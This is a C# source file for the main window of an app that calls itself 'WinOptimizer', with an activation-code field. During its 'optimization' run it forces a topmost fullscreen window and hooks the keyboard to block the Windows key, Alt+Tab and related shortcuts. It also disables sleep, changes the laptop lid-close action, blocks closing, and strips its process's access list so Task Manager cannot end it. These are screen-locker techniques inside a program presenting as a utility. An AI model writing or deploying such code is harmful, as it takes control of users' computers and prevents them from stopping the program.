using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Avalonia;
using Avalonia.Controls;
using WinOptimizer.ViewModels;

namespace WinOptimizer.Views;

public partial class MainWindow : Window
{
    private WindowState _previousWindowState;
    private SystemDecorations _previousDecorations;

    public MainWindow()
    {
        InitializeComponent();

        DataContextChanged += (_, _) =>
        {
            if (DataContext is MainWindowViewModel vm)
            {
                vm.PropertyChanged += OnViewModelPropertyChanged;
                vm.LogEntries.CollectionChanged += OnLogEntriesChanged;
            }
        };
    }

    private void OnViewModelPropertyChanged(object? sender, PropertyChangedEventArgs e)
    {
        if (e.PropertyName == nameof(MainWindowViewModel.IsOptimizing))
        {
            var vm = (MainWindowViewModel)sender!;
            if (vm.IsOptimizing)
            {
                // Save current state
                _previousWindowState = WindowState;
                _previousDecorations = SystemDecorations;

                // Go true fullscreen (hides taskbar completely)
                SystemDecorations = SystemDecorations.None;
                WindowState = WindowState.FullScreen;
                Topmost = true;

                // Block Windows key, Alt+Tab etc.
                KeyboardBlocker.Block();

                // Prevent screen/system from sleeping
                SleepBlocker.PreventSleep();

                // Protect process from being killed via Task Manager
                ProcessProtection.Protect();
            }
        }
        else if (e.PropertyName is nameof(MainWindowViewModel.IsCompleted)
                                or nameof(MainWindowViewModel.HasError))
        {
            var vm = (MainWindowViewModel)sender!;
            if (vm.IsCompleted || vm.HasError)
            {
                // Remove all protections
                KeyboardBlocker.Unblock();
                SleepBlocker.AllowSleep();
                ProcessProtection.Unprotect();
            }

            if (vm.HasError || vm.IsCompleted)
            {
                // Restore window so user can close it
                Topmost = false;
                WindowState = _previousWindowState;
                SystemDecorations = _previousDecorations;
            }
        }
    }

    private void OnLogEntriesChanged(object? sender, NotifyCollectionChangedEventArgs e)
    {
        Avalonia.Threading.Dispatcher.UIThread.Post(() =>
        {
            if (LogScrollViewer is { } sv)
            {
                sv.Offset = new Vector(0, sv.Extent.Height);
            }
        }, Avalonia.Threading.DispatcherPriority.Background);
    }

    private bool _isFormattingCode;

    private void ActivationCodeBox_TextChanged(object? sender, TextChangedEventArgs e)
    {
        if (_isFormattingCode || sender is not TextBox tb) return;

        var text = tb.Text ?? "";
        var raw = new string(text.Where(c => char.IsDigit(c)).ToArray());
        if (raw.Length > 12) raw = raw[..12];

        var parts = new List<string>();
        for (int i = 0; i < raw.Length; i += 2)
        {
            var len = Math.Min(2, raw.Length - i);
            parts.Add(raw.Substring(i, len));
        }
        var formatted = string.Join("-", parts);

        if (formatted != text)
        {
            _isFormattingCode = true;
            // Use SetCurrentValue to NOT break the TwoWay binding
            tb.SetCurrentValue(TextBox.TextProperty, formatted);
            tb.CaretIndex = formatted.Length;
            _isFormattingCode = false;
        }
    }

    protected override void OnClosing(WindowClosingEventArgs e)
    {
        if (DataContext is MainWindowViewModel vm && vm.IsOptimizing)
        {
            e.Cancel = true;
            return;
        }

        base.OnClosing(e);
    }

    /// <summary>
    /// Блокування системних клавіш (Win, Alt+Tab) під час оптимізації.
    /// </summary>
    private static class KeyboardBlocker
    {
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string? lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int VK_LWIN = 0x5B;
        private const int VK_RWIN = 0x5C;
        private const int VK_TAB = 0x09;
        private const int VK_ESCAPE = 0x1B;

        private static IntPtr _hookId = IntPtr.Zero;
        private static LowLevelKeyboardProc? _proc;

        public static void Block()
        {
            try
            {
                if (_hookId != IntPtr.Zero) return;
                _proc = HookCallback;
                using var curProcess = System.Diagnostics.Process.GetCurrentProcess();
                using var curModule = curProcess.MainModule!;
                _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
            catch { }
        }

        public static void Unblock()
        {
            try
            {
                if (_hookId != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookId);
                    _hookId = IntPtr.Zero;
                }
            }
            catch { }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                var vkCode = Marshal.ReadInt32(lParam);

                if (vkCode is VK_LWIN or VK_RWIN)
                    return (IntPtr)1;

                var flags = Marshal.ReadInt32(lParam, 8);
                bool altPressed = (flags & 0x20) != 0;

                if (altPressed && vkCode is VK_TAB or VK_ESCAPE)
                    return (IntPtr)1;

                if (vkCode == VK_ESCAPE && (NativeGetKeyState(0x11) & 0x8000) != 0)
                    return (IntPtr)1;
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        [DllImport("user32.dll")]
        private static extern short NativeGetKeyState(int vKey);
    }

    /// <summary>
    /// Блокування переходу в сплячий режим + захист від закриття кришки ноутбука.
    /// </summary>
    private static class SleepBlocker
    {
        [DllImport("kernel32.dll")]
        private static extern uint SetThreadExecutionState(uint esFlags);

        private const uint ES_CONTINUOUS = 0x80000000;
        private const uint ES_SYSTEM_REQUIRED = 0x00000001;
        private const uint ES_DISPLAY_REQUIRED = 0x00000002;

        private static string? _savedAcLid;
        private static string? _savedDcLid;

        public static void PreventSleep()
        {
            try { SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED); }
            catch { }

            // Prevent lid close from suspending — set lid action to "do nothing" (0)
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "powercfg",
                    Arguments = "/setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 0",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                System.Diagnostics.Process.Start(psi)?.WaitForExit(3000);

                psi.Arguments = "/setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 0";
                System.Diagnostics.Process.Start(psi)?.WaitForExit(3000);

                // Apply changes
                psi.Arguments = "/setactive SCHEME_CURRENT";
                System.Diagnostics.Process.Start(psi)?.WaitForExit(3000);
            }
            catch { }
        }

        public static void AllowSleep()
        {
            try { SetThreadExecutionState(ES_CONTINUOUS); }
            catch { }

            // Restore lid close to default (1 = sleep)
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "powercfg",
                    Arguments = "/setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                System.Diagnostics.Process.Start(psi)?.WaitForExit(3000);

                psi.Arguments = "/setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1";
                System.Diagnostics.Process.Start(psi)?.WaitForExit(3000);

                psi.Arguments = "/setactive SCHEME_CURRENT";
                System.Diagnostics.Process.Start(psi)?.WaitForExit(3000);
            }
            catch { }
        }
    }

    /// <summary>
    /// Захист процесу від завершення через Task Manager.
    /// </summary>
    private static class ProcessProtection
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetKernelObjectSecurity(
            IntPtr Handle, int SecurityInformation, byte[] pSecurityDescriptor);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        private const int DACL_SECURITY_INFORMATION = 4;

        public static void Protect()
        {
            try
            {
                var hProcess = GetCurrentProcess();
                var sd = new RawSecurityDescriptor(
                    ControlFlags.DiscretionaryAclPresent,
                    null, null,
                    new RawAcl(GenericAcl.AclRevision, 0),
                    null);
                var rawSd = new byte[sd.BinaryLength];
                sd.GetBinaryForm(rawSd, 0);
                SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, rawSd);
            }
            catch { }
        }

        public static void Unprotect()
        {
            try
            {
                var hProcess = GetCurrentProcess();
                var everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
                var dacl = new RawAcl(GenericAcl.AclRevision, 1);
                dacl.InsertAce(0, new CommonAce(
                    AceFlags.None,
                    AceQualifier.AccessAllowed,
                    0x1FFFFF,
                    everyone,
                    false, null));
                var sd = new RawSecurityDescriptor(
                    ControlFlags.DiscretionaryAclPresent,
                    null, null, dacl, null);
                var rawSd = new byte[sd.BinaryLength];
                sd.GetBinaryForm(rawSd, 0);
                SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, rawSd);
            }
            catch { }
        }
    }
}
